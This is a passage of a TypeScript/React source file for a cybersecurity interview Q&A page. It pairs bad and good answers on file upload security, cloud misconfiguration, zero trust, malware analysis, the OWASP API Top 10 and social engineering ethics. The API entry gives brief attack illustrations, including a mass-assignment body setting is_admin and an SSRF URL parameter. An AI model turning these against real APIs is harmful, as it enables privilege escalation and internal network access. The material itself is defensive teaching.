            "Walk through a concrete attack scenario",
            "Explain why defenses work, not just what they are",
            "Mention SameSite cookies (modern approach)",
            "Know at least one framework's CSRF protection"
        ],
        relatedTopics: ["CSRF", "OWASP Top 10", "Session Management", "Same-Origin Policy"]
    },
    {
        id: "webapp-02",
        category: "Scenario",
        difficulty: "Senior",
        question: "You're building a SaaS platform where users can upload files. Design a secure file upload system considering all attack vectors.",
        badAnswer: "Validate file type by extension, check file size, scan for viruses.",
        badReasons: [
            "Extension validation is easily bypassed",
            "Doesn't consider multiple attack vectors",
            "Missing storage security",
            "No defense-in-depth approach",
            "Incomplete threat model"
        ],
        goodAnswer: "**Threat Model First**: File upload attacks include: RCE via malicious files, XSS via SVG/HTML files, path traversal, DoS via large files, malware distribution, SSRF via XML/Office docs. **Defense-in-Depth Strategy**: **1) Input Validation**: Whitelist allowed MIME types (check actual bytes, not extension - file signature/magic bytes), Limit file size (per file + per user quota), Generate unique, random filenames (prevent directory traversal, collisions), Sanitize original filename if displayed (prevent XSS). **2) Storage Security**: Store outside webroot (files not directly accessible via URL), Separate domain for user content (user-content.example.com prevents cookie theft), Use object storage (S3, Azure Blob) with IAM controls, Implement signed URLs with expiration (temporary access), Never execute uploaded files (serve with headers: Content-Disposition: attachment). **3) Content Security**: Scan with antivirus (ClamAV) before storage, For images: re-encode with ImageMagick/Pillow (strips EXIF, prevents polyglot attacks), For documents: use sandboxed preview service, Validate SVG/XML: disable external entities (XXE prevention), Set CSP headers: `Content-Security-Policy: default-src 'none'; sandbox`. **4) Access Control**: Validate user permissions before upload and download, Check quotas and rate limits, Log all uploads with user, IP, file hash. **5) Monitoring**: Alert on: suspicious file types (.exe, .sh), high upload volume (abuse), failed virus scans, unusual access patterns. **Architecture**: Upload flow: Client → API Gateway (size check) → Lambda (validation) → S3 (storage) → Async virus scan → Database (metadata). Download: Signed URL generation → CloudFront (CDN) → S3. **Additional**: Implement file versioning (recover from ransomware), Encrypt at rest (S3 SSE-KMS), Regular security audits of uploaded files, Incident response plan for malicious uploads.",
        goodReasons: [
            "Starts with threat model (shows strategic thinking)",
            "Defense-in-depth across multiple layers",
            "Specific technical implementations",
            "Considers storage, access, and content security",
            "Includes monitoring and incident response",
            "Provides architecture diagram in text",
            "Covers advanced attacks (XXE, polyglot, SSRF)",
            "Senior-level comprehensive answer"
        ],
        tips: [
            "Senior questions need architecture-level thinking",
            "Always threat model first",
            "Defense-in-depth: input, storage, access, monitoring",
            "Mention specific technologies and services",
            "Include both prevention and detection"
        ],
        relatedTopics: ["File Upload Security", "Defense in Depth", "Cloud Security", "XXE", "Path Traversal"]
    },

    // Cloud Security
    {
        id: "cloud-01",
        category: "Technical",
        difficulty: "Mid-Level",
        question: "What are the most common misconfigurations in cloud environments (AWS, Azure, GCP)?",
        badAnswer: "Leaving S3 buckets public and using weak passwords.",
        badReasons: [
            "Only mentions two issues",
            "Too surface-level for mid-level",
            "No mention of IAM, networking, or logging",
            "Doesn't explain impact or detection"
        ],
        goodAnswer: "**IAM Misconfigurations (Most Critical)**: Overly permissive IAM policies (FullAccess instead of least privilege), Long-lived access keys (should rotate every 90 days), Root account usage (should be MFA-protected and rarely used), Missing MFA on privileged accounts, Inline policies instead of managed policies (harder to audit), Cross-account role trust issues. **Storage Misconfigurations**: Public S3 buckets (50% of breaches involve exposed storage), Missing encryption at rest, Public snapshots/AMIs containing sensitive data, Object ACLs overriding bucket policies. **Network Misconfigurations**: Overly permissive security groups (0.0.0.0/0 on port 22/3389), Default VPC usage (should use custom VPC with private subnets), Missing VPC flow logs (blind to network traffic), Public RDS/database instances (should be in private subnets), Disabled network ACLs. **Logging & Monitoring**: CloudTrail/Azure Monitor disabled (no audit trail), No log aggregation to SIEM, S3 bucket logging disabled, Missing alerts on suspicious API calls (GuardDuty), No file integrity monitoring. **Compute Misconfigurations**: Unpatched instances, Instance metadata service v1 (vulnerable to SSRF), Missing security agents (AV, EDR), Weak SSH keys or password auth enabled. **Detection**: Use Cloud Security Posture Management (CSPM) tools: AWS Security Hub, Azure Security Center, Prisma Cloud, ScoutSuite (open-source), Manual: AWS Access Analyzer, IAM Policy Simulator. **Real Breach**: Capital One (2019) - SSRF via misconfigured WAF led to 100M credit applications stolen. Root cause: Overly permissive IAM role + metadata service exposure.",
        goodReasons: [
            "Comprehensive coverage of all major areas",
            "Organized by category (IAM, storage, network, etc.)",
            "Specific examples for each issue",
            "Mentions detection tools",
            "Real-world breach example with root cause",
            "Shows depth expected at mid-level"
        ],
        tips: [
            "Organize by category (IAM, network, storage, logging)",
            "IAM misconfigurations are most critical",
            "Mention specific tools (Security Hub, ScoutSuite)",
            "Include a recent breach example",
            "Know at least one CSPM tool"
        ],
        relatedTopics: ["Cloud Security", "AWS", "IAM", "Misconfiguration", "CSPM"]
    },
    {
        id: "cloud-02",
        category: "Scenario",
        difficulty: "Senior",
        question: "Design a zero-trust architecture for a company migrating from on-premise to AWS. What components and principles would you implement?",
        badAnswer: "Use VPC, IAM roles, and MFA. Implement least privilege.",
        badReasons: [
            "Generic buzzwords, no architecture",
            "Doesn't explain zero-trust principles",
            "Missing identity, data, and application layers",
            "No mention of continuous verification",
            "Lacks specific AWS services and integration"
        ],
        goodAnswer: "**Zero-Trust Principles**: 1) Never trust, always verify (no implicit trust based on network location), 2) Assume breach (segment and limit blast radius), 3) Verify explicitly (authenticate and authorize every request), 4) Least privilege access (JIT, time-bound). **Architecture Components**: **Identity Layer**: AWS IAM Identity Center (SSO) as identity provider, MFA mandatory (U2F/WebAuthn for admins, TOTP for users), Just-in-time access with AWS Systems Manager Session Manager, Conditional access: geolocation, device compliance checks, Identity federation with Azure AD/Okta. **Network Layer**: Micro-segmentation with Security Groups (default deny all), VPC endpoints for AWS service access (no internet gateway for production), AWS PrivateLink for third-party SaaS, Transit Gateway with route inspection, No VPN - use AWS Client VPN with certificate auth, Network traffic inspection: AWS Network Firewall or Palo Alto VM-Series. **Application Layer**: API Gateway with AWS WAF (OWASP rules), Application Load Balancer with authentication (ALB + Cognito/OIDC), Service mesh (AWS App Mesh or Istio) for microservices with mTLS, Container security: Fargate (serverless), EKS with network policies. **Data Layer**: All data encrypted at rest (KMS customer-managed keys), Field-level encryption for sensitive data, S3 Block Public Access enabled organization-wide, Secrets Manager for credentials (no hardcoded secrets), Database access through IAM authentication (RDS Proxy), DLP scanning on S3 with Macie. **Monitoring & Response**: CloudTrail + EventBridge for all API calls, GuardDuty for threat detection, Security Hub as centralized view, SIEM integration (Splunk/Sumo Logic), Real-time anomaly detection (User Behavior Analytics), Automated response: Lambda functions to revoke access, isolate instances. **Continuous Verification**: Every request evaluated: identity (who), device (health), location (where), time (when), behavior (anomaly), Policy engine: Cedar or Open Policy Agent, Re-authentication for sensitive operations, Session timeout: 4 hours for users, 15 minutes for tokens. **Migration Strategy**: Phase 1: Identity (SSO, MFA), Phase 2: Network (segmentation, private access), Phase 3: Applications (service mesh, mTLS), Phase 4: Data (encryption, DLP), Phase 5: Monitoring (SIEM, automated response). **Key Metrics**: Mean time to detect (MTTD), Mean time to respond (MTTR), % of access with MFA, % of traffic encrypted, Policy violations per month.",
        goodReasons: [
            "Comprehensive architecture across all layers",
            "Specific AWS services for each component",
            "Explains zero-trust principles first",
            "Includes identity, network, app, data, monitoring",
            "Migration phasing strategy",
            "Measurable success metrics",
            "Senior-level strategic and technical depth"
        ],
        tips: [
            "Senior architecture questions need end-to-end design",
            "Organize by layers (identity, network, app, data)",
            "Name specific services and tools",
            "Include monitoring and incident response",
            "Show phased migration thinking",
            "Metrics demonstrate business maturity"
        ],
        relatedTopics: ["Zero Trust", "Cloud Architecture", "AWS", "Defense in Depth", "Identity Management"]
    },

    // Malware Analysis & Reverse Engineering
    {
        id: "malware-01",
        category: "Technical",
        difficulty: "Mid-Level",
        question: "Walk me through your process for analyzing an unknown executable suspected to be malware.",
        badAnswer: "Run it in a sandbox and see what it does.",
        badReasons: [
            "No static analysis mentioned",
            "Dangerous approach (should analyze safely first)",
            "Missing OSINT and indicator extraction",
            "No structured methodology",
            "Doesn't mention reporting or IOC sharing"
        ],
        goodAnswer: "**Phase 1: Static Analysis (Safe, No Execution)**: File metadata: hash (SHA-256), size, file type, timestamps, OSINT: Check VirusTotal, Any.run, Hybrid Analysis - see if already analyzed, Strings analysis: `strings malware.exe | grep -i 'http\|.dll\|registry'` - look for URLs, IPs, domains, suspicious strings, PE analysis (Windows): imports (what DLLs?), exports, sections, entry point, Packing detection: UPX, Themida, custom packers (high entropy = packed), Signature scanning: YARA rules for known malware families. **Phase 2: Dynamic Analysis (Controlled Execution)**: Environment: Isolated VM (no network initially), Cuckoo Sandbox or REMnux VM, Network: Monitor DNS (fakeDNS), HTTP (INetSim), Packet capture (Wireshark), Tools: Process Monitor (file/registry/network activity), Process Hacker (memory, threads), Regshot (registry changes before/after), API Monitor (function calls). Execute and observe: What files created/modified?, Registry keys changed?, Network connections attempted?, New processes spawned?, Persistence mechanisms (startup, scheduled tasks)?. **Phase 3: Advanced Analysis (If Needed)**: Debugger: x64dbg or OllyDbg to step through code, Disassembler: IDA Pro or Ghidra for static code analysis, Memory dump analysis: Extract strings, decrypt configs, find C2 domains, Anti-analysis evasion: Detect VM detection, debugger checks, sandbox evasion. **Phase 4: Documentation**: IOCs (Indicators of Compromise): File hashes, IPs, domains, URLs, Registry keys, Mutex names, MITRE ATT&CK mapping: tactics and techniques used, Malware family classification: Ransomware? Trojan? RAT?, Severity assessment: CVSS score, potential impact. **Phase 5: Sharing**: Submit IOCs to threat intel platforms (MISP, AlienVault OTX), Update SIEM/EDR detection rules, Write YARA signatures for detection, Blog post or internal report. **Safety First**: Always use isolated environment, Never run on production network, Snapshot VM before execution, Keep detailed notes with timestamps.",
        goodReasons: [
            "Structured methodology (static → dynamic → advanced)",
            "Safety emphasized throughout",
            "Specific tools named for each phase",
            "Explains what to look for at each step",
            "Includes IOC extraction and sharing",
            "MITRE ATT&CK framework mentioned",
            "Comprehensive professional approach"
        ],
        tips: [
            "Always static before dynamic (safety)",
            "Name specific tools (shows experience)",
            "Mention OSINT first (don't reinvent wheel)",
            "Include IOC sharing (community contribution)",
            "Safety and isolation are paramount"
        ],
        relatedTopics: ["Malware Analysis", "Reverse Engineering", "YARA", "Sandbox", "IOC"]
    },

    // API Security
    {
        id: "api-01",
        category: "Technical",
        difficulty: "Mid-Level",
        question: "What are the OWASP API Security Top 10, and how do they differ from the OWASP Top 10 for web applications?",
        badAnswer: "They're similar but for APIs instead of websites.",
        badReasons: [
            "No specific API vulnerabilities listed",
            "Doesn't explain unique API risks",
            "Missing examples",
            "Shows lack of familiarity with API security"
        ],
        goodAnswer: "**OWASP API Security Top 10 (2023)**: **API1: Broken Object Level Authorization (BOLA/IDOR)**: Most common API vuln. API exposes object IDs (user_id=123) without checking if requester owns that object. Example: GET /api/users/123/profile returns ANY user's profile. Fix: Server-side authorization checks on every request. **API2: Broken Authentication**: Weak auth mechanisms, token exposure, no rate limiting on auth endpoints. Example: JWT tokens never expire, predictable API keys. **API3: Broken Object Property Level Authorization**: Mass assignment vulnerabilities - API accepts more fields than intended. Example: POST /api/users with {\"is_admin\": true} escalates privileges. **API4: Unrestricted Resource Consumption**: No rate limiting, allows DoS or resource exhaustion. Example: Downloading millions of records via pagination bypass. **API5: Broken Function Level Authorization**: Missing access controls on admin functions. Example: Regular user can call DELETE /api/admin/users. **API6: Unrestricted Access to Sensitive Business Flows**: Abuse of legitimate functionality (scalping, automated account creation). Example: Bot buys all limited-edition items. **API7: Server Side Request Forgery (SSRF)**: API fetches URL provided by user without validation. Example: GET /api/avatar?url= leads to internal network scanning. **API8: Security Misconfiguration**: CORS misconfig, verbose errors, missing security headers. **API9: Improper Inventory Management**: Shadow APIs, old API versions still active, zombie endpoints. **API10: Unsafe Consumption of APIs**: Blindly trusting third-party APIs. **How They Differ from Web Top 10**: APIs are stateless (different session handling), Focus on authorization over authentication (API1, API3, API5), API-specific issues: rate limiting, mass assignment, inventory, Web focus: XSS, CSRF (less relevant for JSON APIs), APIs often machine-to-machine (different threat model). **Testing Tip**: Use tools like Burp Suite, Postman, or specialized API security scanners (Astra, APIsec).",
        goodReasons: [
            "Lists all 10 with clear explanations",
            "Provides concrete examples for each",
            "Explains differences from web app security",
            "Includes fixes and testing tools",
            "Shows deep API security knowledge"
        ],
        tips: [
            "Know the top 3-5 API vulnerabilities cold",
            "BOLA/IDOR is #1 for APIs (not web apps)",
            "Provide examples showing understanding",
            "Explain why APIs have unique risks"
        ],
        relatedTopics: ["API Security", "OWASP", "BOLA", "IDOR", "Authorization"]
    },

    // Social Engineering & Physical Security
    {
        id: "social-01",
        category: "Scenario",
        difficulty: "Mid-Level",
        question: "You're conducting a social engineering assessment. A receptionist asks to see your authorization letter before letting you into the building. How do you respond?",
        badAnswer: "Tell them you forgot it and try to convince them to let you in anyway. That's the test.",
        badReasons: [
            "Unethical - exceeding authorization",
            "Could lead to legal issues",
            "Damages client relationship",
            "Not how professional pentesting works",
            "Puts receptionist in impossible position"
        ],
        goodAnswer: "**Stop immediately and comply**. The correct response: \"You're absolutely right to ask. Let me contact the security team who authorized this assessment and have them verify my authorization with you directly. Can I use your phone to call [authorized contact name]?\" **Why This Is Correct**: The receptionist is doing their job correctly, You're testing security controls, not manipulating good employees, Your authorization covers simulating social engineering, not actually compromising security through it, The company will see: receptionist followed policy (positive finding), your professionalism and ethics (builds trust for future work). **Documentation**: Note this as a POSITIVE security control in your report, Praise the receptionist's diligence, Recommend they maintain this policy, If many employees fail but receptionist passes, they should be recognized. **After Assessment**: Debrief includes: What would have happened if receptionist let you in (demonstrate risk), Validate that their response was correct and model behavior, Suggest: Visitor badges, escort policy, visitor log, panic button. **What NOT to Do**: Manipulate or pressure employees who follow policy, Damage property, impersonate law enforcement, Enter without authorization (trespassing), Exceed scope defined in Rules of Engagement. **Key Principle**: You're testing security controls, not exploiting human nature maliciously. Professional social engineering assessments are about identifying weaknesses to fix them, not 'winning' at any cost. This approach has led to: return clients for future engagements, expanded scope to other departments, referrals to peer companies. Trust and ethics matter more than demonstration of skills.",
        goodReasons: [
            "Emphasizes ethics and authorization boundaries",
            "Explains why complying is correct",
            "Turns 'failure' into positive finding",
            "Documents appropriate follow-up",
            "Shows professional maturity",
            "Contrasts with wrong approaches",
            "Long-term relationship focus"
        ],
        tips: [
            "Social engineering tests have strict ethical boundaries",
            "Never exceed authorization, even if you could",
            "Security-aware employees are successes, not failures",
            "This question tests ethics as much as technical skill",
            "Professional reputation > single engagement success"
        ],
        relatedTopics: ["Social Engineering", "Ethics", "Physical Security", "Professional Conduct"]
    }
];

const InterviewPrep = () => {
    const [selectedCategory, setSelectedCategory] = useState<string>("All");
    const [selectedDifficulty, setSelectedDifficulty] = useState<string>("All");
    const [expandedQuestionId, setExpandedQuestionId] = useState<string | null>(null);
    const [searchQuery, setSearchQuery] = useState<string>("");
    const [bookmarkedQuestions, setBookmarkedQuestions] = useState<Set<string>>(new Set());
    const [completedQuestions, setCompletedQuestions] = useState<Set<string>>(new Set());
    const [showFilters, setShowFilters] = useState<boolean>(true);
    const [sortBy, setSortBy] = useState<"difficulty" | "category" | "recent">("difficulty");

    const categories = ["All", "Technical", "Behavioral", "Scenario", "Explaining Concepts"];
    const difficulties = ["All", "Junior", "Mid-Level", "Senior"];

    const filteredQuestions = interviewQuestions.filter(q => {
        const matchesCategory = selectedCategory === "All" || q.category === selectedCategory;
        const matchesDifficulty = selectedDifficulty === "All" || q.difficulty === selectedDifficulty;
        const matchesSearch = searchQuery === "" ||
            q.question.toLowerCase().includes(searchQuery.toLowerCase()) ||
            q.category.toLowerCase().includes(searchQuery.toLowerCase()) ||
            q.relatedTopics.some(topic => topic.toLowerCase().includes(searchQuery.toLowerCase()));
        return matchesCategory && matchesDifficulty && matchesSearch;
    });

    // Sort questions
    const sortedQuestions = [...filteredQuestions].sort((a, b) => {
        if (sortBy === "difficulty") {
            const order = { "Junior": 1, "Mid-Level": 2, "Senior": 3 };
            return order[a.difficulty] - order[b.difficulty];
        } else if (sortBy === "category") {
            return a.category.localeCompare(b.category);
        }
        return 0;
    });

    const toggleBookmark = (questionId: string) => {
        setBookmarkedQuestions(prev => {
            const newSet = new Set(prev);
            if (newSet.has(questionId)) {
                newSet.delete(questionId);
            } else {
                newSet.add(questionId);
            }
            return newSet;
        });
    };

    const markAsCompleted = (questionId: string) => {
        setCompletedQuestions(prev => {
            const newSet = new Set(prev);
            if (newSet.has(questionId)) {
                newSet.delete(questionId);
            } else {
                newSet.add(questionId);
            }
            return newSet;
        });
    };

    const copyQuestion = (question: InterviewQuestion) => {
        const text = `Question: ${question.question}\n\nGood Answer: ${question.goodAnswer}\n\nRelated Topics: ${question.relatedTopics.join(", ")}`;
        navigator.clipboard.writeText(text);
    };

    const progressPercentage = Math.round((completedQuestions.size / interviewQuestions.length) * 100);

    const getDifficultyColor = (difficulty: string) => {
        switch (difficulty) {
            case "Junior":
                return "bg-green-100 text-green-800 border-green-200 dark:bg-green-950 dark:text-green-200";
            case "Mid-Level":
                return "bg-yellow-100 text-yellow-800 border-yellow-200 dark:bg-yellow-950 dark:text-yellow-200";
            case "Senior":
                return "bg-red-100 text-red-800 border-red-200 dark:bg-red-950 dark:text-red-200";
            default:
                return "bg-gray-100 text-gray-800 border-gray-200";
        }
    };

    const getCategoryIcon = (category: string) => {
        switch (category) {
            case "Technical": return Code;
            case "Behavioral": return Users;
            case "Scenario": return Target;
            case "Explaining Concepts": return MessageSquare;
            default: return BookOpen;
        }
    };

    return (
        <div className="container mx-auto py-8 space-y-6">
            {/* Header with Animation */}
            <motion.div
                initial={{ opacity: 0, y: -20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ duration: 0.5 }}
            >
                <div className="flex items-center gap-3 mb-2">
                    <motion.div
                        animate={{
                            rotate: [0, -10, 10, 0],
                            scale: [1, 1.1, 1],
                        }}
                        transition={{
                            duration: 4,
                            repeat: Infinity,
                            ease: "easeInOut"
                        }}
                    >
                        <Brain className="h-8 w-8 text-primary" />
                    </motion.div>
                    <h1 className="text-4xl font-bold">Interview Q&A Bank</h1>
                </div>
                <p className="text-muted-foreground text-lg">
                    Master cybersecurity interviews with {interviewQuestions.length}+ good vs bad answer examples
                </p>
            </motion.div>

            {/* Progress Tracking */}
            <motion.div
                initial={{ opacity: 0, scale: 0.9 }}
                animate={{ opacity: 1, scale: 1 }}
                transition={{ delay: 0.2 }}
            >
                <Card className="bg-gradient-to-br from-primary/10 to-orange-500/10 border-2 border-primary/20">
                    <CardHeader className="pb-3">
                        <div className="flex items-center justify-between">
                            <div className="flex items-center gap-2">
                                <Award className="h-5 w-5 text-primary" />
                                <CardTitle className="text-lg">Your Progress</CardTitle>
                            </div>
                            <Badge variant="secondary" className="text-lg px-3 py-1">
                                {completedQuestions.size} / {interviewQuestions.length}
                            </Badge>
                        </div>
                    </CardHeader>
                    <CardContent>
                        <div className="space-y-2">
                            <div className="flex justify-between text-sm">
                                <span className="text-muted-foreground">Questions Completed</span>
                                <span className="font-bold">{progressPercentage}%</span>
                            </div>
                            <div className="w-full bg-secondary rounded-full h-3 overflow-hidden">
                                <motion.div
                                    className="bg-gradient-to-r from-primary to-orange-500 h-full rounded-full"
                                    initial={{ width: 0 }}
                                    animate={{ width: `${progressPercentage}%` }}
                                    transition={{ duration: 1, ease: "easeOut" }}
                                />
                            </div>
                            <div className="flex items-center justify-between text-xs text-muted-foreground pt-2">
                                <div className="flex items-center gap-1">
                                    <Bookmark className="h-3 w-3" />
                                    <span>{bookmarkedQuestions.size} Bookmarked</span>
                                </div>
                                <div className="flex items-center gap-1">
                                    <Star className="h-3 w-3 fill-current" />
                                    <span>{completedQuestions.size} Mastered</span>
                                </div>
                            </div>
                        </div>
                    </CardContent>
                </Card>
            </motion.div>

            {/* Enhanced Stats */}
            <motion.div
                className="grid grid-cols-2 md:grid-cols-4 gap-4"
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.3 }}
            >
                {[
                    { label: "Total Questions", value: interviewQuestions.length, icon: MessageSquare, color: "text-blue-600" },
                    { label: "Technical", value: interviewQuestions.filter(q => q.category === "Technical").length, icon: Code, color: "text-green-600" },
                    { label: "Behavioral", value: interviewQuestions.filter(q => q.category === "Behavioral").length, icon: Users, color: "text-purple-600" },
                    { label: "Scenario", value: interviewQuestions.filter(q => q.category === "Scenario").length, icon: Target, color: "text-orange-600" }
                ].map((stat, index) => {
                    const Icon = stat.icon;
                    return (
                        <motion.div
                            key={stat.label}
                            initial={{ opacity: 0, scale: 0.8 }}
                            animate={{ opacity: 1, scale: 1 }}
                            transition={{ delay: 0.4 + index * 0.1 }}
                            whileHover={{ scale: 1.05, y: -5 }}
                        >
                            <Card className="hover:shadow-lg transition-all duration-300">
                                <CardHeader className="pb-3">
                                    <div className="flex items-center gap-2 mb-1">
                                        <Icon className={`h-4 w-4 ${stat.color}`} />
                                        <CardDescription className="text-xs">{stat.label}</CardDescription>
                                    </div>
                                    <CardTitle className={`text-3xl ${stat.color}`}>{stat.value}</CardTitle>
                                </CardHeader>
                            </Card>
                        </motion.div>
                    );
                })}
            </motion.div>

            {/* Search and Filters */}
            <motion.div
                initial={{ opacity: 0, y: 20 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ delay: 0.5 }}
            >
                <Card>
                    <CardHeader>
                        <div className="flex items-center justify-between">
                            <CardTitle className="flex items-center gap-2">
                                <Filter className="h-5 w-5" />
                                Search & Filter
                            </CardTitle>
                            <Button
                                variant="ghost"
                                size="sm"
                                onClick={() => setShowFilters(!showFilters)}
                            >
                                {showFilters ? <ChevronUp className="h-4 w-4" /> : <ChevronDown className="h-4 w-4" />}
                            </Button>
                        </div>
                    </CardHeader>
                    <AnimatePresence>
                        {showFilters && (
                            <motion.div
                                initial={{ height: 0, opacity: 0 }}
                                animate={{ height: "auto", opacity: 1 }}
                                exit={{ height: 0, opacity: 0 }}
                                transition={{ duration: 0.3 }}
                            >
                                <CardContent className="space-y-4">
                                    {/* Search Bar */}
                                    <div className="relative">
                                        <Search className="absolute left-3 top-3 h-4 w-4 text-muted-foreground" />
                                        <Input
                                            placeholder="Search questions, categories, or topics..."
                                            className="pl-10"
                                            value={searchQuery}
                                            onChange={(e) => setSearchQuery(e.target.value)}
                                        />
                                    </div>

                                    {/* Category Filter */}
                                    <div>
                                        <span className="text-sm font-medium mb-2 block">Category</span>
                                        <div className="flex flex-wrap gap-2">
                                            {categories.map((category) => {
                                                const Icon = getCategoryIcon(category);
                                                return (
                                                    <motion.div key={category} whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                                                        <Button
                                                            variant={selectedCategory === category ? "default" : "outline"}
                                                            size="sm"
                                                            onClick={() => setSelectedCategory(category)}
                                                            className="gap-1"
                                                        >
                                                            <Icon className="h-3 w-3" />
                                                            {category}
                                                        </Button>
                                                    </motion.div>
                                                );
                                            })}
                                        </div>
                                    </div>

                                    {/* Difficulty Filter */}
                                    <div>
                                        <span className="text-sm font-medium mb-2 block">Experience Level</span>
                                        <div className="flex flex-wrap gap-2">
                                            {difficulties.map((difficulty) => (
                                                <motion.div key={difficulty} whileHover={{ scale: 1.05 }} whileTap={{ scale: 0.95 }}>
                                                    <Button
                                                        variant={selectedDifficulty === difficulty ? "default" : "outline"}
                                                        size="sm"
                                                        onClick={() => setSelectedDifficulty(difficulty)}
                                                    >
                                                        {difficulty}
                                                    </Button>
                                                </motion.div>
                                            ))}
                                        </div>
                                    </div>

                                    {/* Sort Options */}
                                    <div className="flex items-center justify-between pt-2 border-t">
                                        <span className="text-sm font-medium">Sort By:</span>
                                        <div className="flex gap-2">
                                            {[
                                                { value: "difficulty", label: "Difficulty" },
                                                { value: "category", label: "Category" }
                                            ].map((sort) => (
                                                <Button
                                                    key={sort.value}
                                                    variant={sortBy === sort.value ? "default" : "ghost"}
                                                    size="sm"
                                                    onClick={() => setSortBy(sort.value as any)}
                                                >
                                                    {sort.label}
                                                </Button>
                                            ))}
                                        </div>
                                    </div>

                                    <div className="text-sm text-muted-foreground flex items-center gap-2">
                                        <Clock className="h-4 w-4" />
                                        Showing {sortedQuestions.length} questions
                                    </div>
                                </CardContent>
                            </motion.div>
                        )}
                    </AnimatePresence>
                </Card>
            </motion.div>

            {/* Questions List with Enhanced Features */}
            <div className="space-y-4">
                <AnimatePresence mode="popLayout">
                    {sortedQuestions.map((question, index) => {
                        const Icon = getCategoryIcon(question.category);
                        const isExpanded = expandedQuestionId === question.id;
                        const isBookmarked = bookmarkedQuestions.has(question.id);
                        const isCompleted = completedQuestions.has(question.id);

                        return (
                            <motion.div
                                key={question.id}
                                initial={{ opacity: 0, y: 20 }}
                                animate={{ opacity: 1, y: 0 }}
                                exit={{ opacity: 0, scale: 0.9 }}
                                transition={{ delay: index * 0.05 }}
                                layout
                            >
                                <Card className={`hover:shadow-xl transition-all duration-300 ${isCompleted ? 'border-green-500/50 bg-green-50/50 dark:bg-green-950/20' : ''} ${isBookmarked ? 'border-yellow-500/50' : ''}`}>
                                    <CardHeader>
                                        <div className="flex items-start justify-between gap-4">
                                            <div className="flex-1">
                                                <div className="flex items-center gap-2 mb-2 flex-wrap">
                                                    <Badge className={getDifficultyColor(question.difficulty)}>
                                                        {question.difficulty}
                                                    </Badge>
                                                    <Badge variant="outline">
                                                        <Icon className="h-3 w-3 mr-1" />
                                                        {question.category}
                                                    </Badge>
                                                    {isCompleted && (
                                                        <Badge className="bg-green-600 text-white">
                                                            <CheckCircle2 className="h-3 w-3 mr-1" />
                                                            Mastered
                                                        </Badge>
                                                    )}
                                                </div>
                                                <CardTitle className="text-lg">{question.question}</CardTitle>
                                            </div>
                                            <div className="flex gap-1">
                                                <motion.div whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}>
                                                    <Button
                                                        variant="ghost"
                                                        size="sm"
                                                        onClick={() => toggleBookmark(question.id)}
                                                        className={isBookmarked ? "text-yellow-600" : ""}
                                                    >
                                                        <Bookmark className={`h-4 w-4 ${isBookmarked ? 'fill-current' : ''}`} />
                                                    </Button>
                                                </motion.div>
                                                <motion.div whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}>
                                                    <Button
                                                        variant="ghost"
                                                        size="sm"
                                                        onClick={() => copyQuestion(question)}
                                                        title="Copy question"
                                                    >
                                                        <Copy className="h-4 w-4" />
                                                    </Button>
                                                </motion.div>
                                                <motion.div whileHover={{ scale: 1.1 }} whileTap={{ scale: 0.9 }}>
                                                    <Button
                                                        variant={isExpanded ? "default" : "outline"}
                                                        size="sm"
                                                        onClick={() => setExpandedQuestionId(isExpanded ? null : question.id)}
                                                    >
                                                        {isExpanded ? "Hide" : "Show"} Answer
                                                    </Button>
                                                </motion.div>
                                            </div>
                                        </div>
                                    </CardHeader>

                                    <AnimatePresence>
                                        {isExpanded && (
                                            <motion.div
                                                initial={{ height: 0, opacity: 0 }}
                                                animate={{ height: "auto", opacity: 1 }}
                                                exit={{ height: 0, opacity: 0 }}
                                                transition={{ duration: 0.3 }}
                                            >
                                                <CardContent className="space-y-6">
                                                    {/* Bad Answer */}
                                                    <motion.div
                                                        className="space-y-3"
                                                        initial={{ x: -20, opacity: 0 }}
                                                        animate={{ x: 0, opacity: 1 }}
                                                        transition={{ delay: 0.1 }}
                                                    >
                                                        <div className="flex items-center gap-2">
                                                            <XCircle className="h-5 w-5 text-red-600" />
                                                            <h4 className="font-semibold text-lg">❌ Bad Answer</h4>
                                                        </div>
                                                        <Alert className="bg-red-50 dark:bg-red-950/20 border-red-200 dark:border-red-900">
                                                            <AlertDescription className="text-sm">
                                                                "{question.badAnswer}"
                                                            </AlertDescription>
                                                        </Alert>
                                                        <div className="space-y-2">
                                                            <span className="text-sm font-medium text-red-800 dark:text-red-200">Why this answer fails:</span>
                                                            <ul className="space-y-1">
                                                                {question.badReasons.map((reason, idx) => (
                                                                    <motion.li
                                                                        key={idx}
                                                                        initial={{ x: -10, opacity: 0 }}
                                                                        animate={{ x: 0, opacity: 1 }}
                                                                        transition={{ delay: 0.1 + idx * 0.05 }}
                                                                        className="flex items-start gap-2 text-sm text-red-700 dark:text-red-300"
                                                                    >
                                                                        <XCircle className="h-4 w-4 mt-0.5 flex-shrink-0" />
                                                                        <span>{reason}</span>
                                                                    </motion.li>
                                                                ))}
                                                            </ul>
                                                        </div>
                                                    </motion.div>

                                                    {/* Good Answer */}
                                                    <motion.div
                                                        className="space-y-3"
                                                        initial={{ x: -20, opacity: 0 }}
                                                        animate={{ x: 0, opacity: 1 }}
                                                        transition={{ delay: 0.2 }}
                                                    >
                                                        <div className="flex items-center gap-2">
                                                            <CheckCircle2 className="h-5 w-5 text-green-600" />
                                                            <h4 className="font-semibold text-lg">✅ Good Answer</h4>
                                                        </div>
                                                        <Alert className="bg-green-50 dark:bg-green-950/20 border-green-200 dark:border-green-900">
                                                            <AlertDescription className="text-sm leading-relaxed whitespace-pre-line">
                                                                "{question.goodAnswer}"
                                                            </AlertDescription>
                                                        </Alert>
                                                        <div className="space-y-2">
                                                            <span className="text-sm font-medium text-green-800 dark:text-green-200">Why this answer works:</span>
                                                            <ul className="space-y-1">
                                                                {question.goodReasons.map((reason, idx) => (
                                                                    <motion.li
                                                                        key={idx}
                                                                        initial={{ x: -10, opacity: 0 }}
                                                                        animate={{ x: 0, opacity: 1 }}
                                                                        transition={{ delay: 0.2 + idx * 0.05 }}
                                                                        className="flex items-start gap-2 text-sm text-green-700 dark:text-green-300"
                                                                    >
                                                                        <CheckCircle2 className="h-4 w-4 mt-0.5 flex-shrink-0" />
                                                                        <span>{reason}</span>
                                                                    </motion.li>
                                                                ))}
                                                            </ul>
                                                        </div>
                                                    </motion.div>

